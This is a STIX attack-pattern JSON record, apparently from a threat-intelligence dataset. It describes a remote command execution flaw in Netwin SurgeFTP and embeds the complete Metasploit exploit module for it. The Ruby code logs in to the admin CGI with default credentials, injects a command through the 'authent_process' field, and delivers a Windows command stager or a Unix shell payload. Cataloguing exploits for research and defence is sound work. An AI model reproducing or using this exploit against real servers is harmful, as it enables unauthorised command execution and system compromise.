{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d07a7e8e-6b54-4101-ac80-e075eb51ec99",
    "created": "2024-08-14T17:08:10.818635Z",
    "modified": "2024-08-14T17:08:10.818639Z",
    "name": "Netwin SurgeFTP Remote Command Execution",
    "description": " This module exploits a vulnerability found in Netwin SurgeFTP, version 23c8 or prior.  In order to execute commands via the FTP service, please note that you must have a valid credential to the web-based administrative console. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/netwin_surgeftp_exec.rb",
            "external_id": "netwin_surgeftp_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Netwin SurgeFTP Remote Command Execution',\n      'Description'    => %q{\n          This module exploits a vulnerability found in Netwin SurgeFTP, version 23c8\n        or prior.  In order to execute commands via the FTP service, please note that\n        you must have a valid credential to the web-based administrative console.\n      },\n      'Author'         =>\n        [\n          'Spencer McIntyre',  #Who found this vuln?\n          'sinn3r'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '89105' ],\n          [ 'EDB', '23522' ]\n        ],\n      'Platform'       => %w{ win unix },\n      'Targets'        =>\n        [\n          [ 'Windows', { 'Arch'=>ARCH_X86, 'Platform'=>'win', 'CmdStagerFlavor' => 'vbs'}  ],\n          [ 'Unix',    { 'Arch'=>ARCH_CMD, 'Platform'=>'unix', 'Payload'=>{'BadChars' => \"\\x22\"}} ]\n        ],\n      'DisclosureDate' => '2012-12-06',\n      'Notes'          =>\n        {\n          'Stability'   => [ CRASH_SAFE, ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, ],\n          'Reliability' => [ REPEATABLE_SESSION, ],\n        },\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(7021),\n        OptString.new('HttpUsername', [ true, 'The username with admin role to authenticate as', 'admin' ]),\n        OptString.new('HttpPassword', [ true, 'The password for the specified username', 'password' ])\n      ])\n  end\n\n  def check\n    res = send_request_raw({'uri'=>'/cgi/surgeftpmgr.cgi'})\n    if res and res.body =~ /surgeftp\\x20\\x0d\\x0a\\x20\\x20Manager CGI/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def execute_command(cmd, opts)\n    http_send_command(\"cmd.exe /q /c #{cmd}\")\n  end\n\n  def http_send_command(command)\n    res = send_request_cgi(\n    {\n      'uri'     => '/cgi/surgeftpmgr.cgi',\n      'method'  => 'POST',\n      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n      'vars_post' =>\n        {\n          'global_smtp' => \"\",\n          'global_restart' => \"\",\n          'global_style' => \"\",\n          'global_bind' => \"\",\n          'global_passive_ip' => \"\",\n          'global_passive_match' => \"\",\n          'global_logon_mode' => \"\",\n          'global_log_host' => \"\",\n          'global_login_error' => \"\",\n          'global_adminip' => \"\",\n          'global_total_users' => \"\",\n          'global_con_perip' => \"\",\n          'global_ssl' => \"\",\n          'global_ssl_cipher_list' => \"\",\n          'global_implicit_port' => \"\",\n          'log_level' => \"\",\n          'log_home' => \"\",\n          'global_watcher_program_ul' => \"\",\n          'global_watcher_program_dl' => \"\",\n          'authent_process' => command,\n          'authent_cmdopts' => \"\",\n          'authent_number' => \"\",\n          'authent_domain' => \"\",\n          'global_strip_user_domain' => \"\",\n          'global_noclass' => \"\",\n          'global_anon_hammer_over_time' => \"\",\n          'global_anon_hammer_max' => \"\",\n          'global_anon_hammer_block_time' => \"\",\n          'global_port' => \"\",\n          'global_mgr_port' => \"\",\n          'global_mgr_ssl_port' => \"\",\n          'cmd_global_save.x' => \"36\",\n          'cmd_global_save.y' => \"8\",\n        }\n    })\n\n    if res and res.body =~ /401 Authorization failed/\n      fail_with(Failure::NoAccess, \"Unable to log in!\")\n    elsif not (res and res.code == 200)\n      fail_with(Failure::Unknown, 'Failed to execute command.')\n    end\n  end\n\n  def exploit\n    case target['Platform']\n    when 'win'\n      print_status(\"#{rhost}:#{rport} - Sending command stager...\")\n      execute_cmdstager({:linemax=>500})\n\n    when 'unix'\n      print_status(\"#{rhost}:#{rport} - Sending payload...\")\n      http_send_command(%Q|/bin/sh -c \"#{payload.encoded}\"|)\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-12-06",
    "x_mitre_platforms": [
        "%w{ win unix }"
    ]
}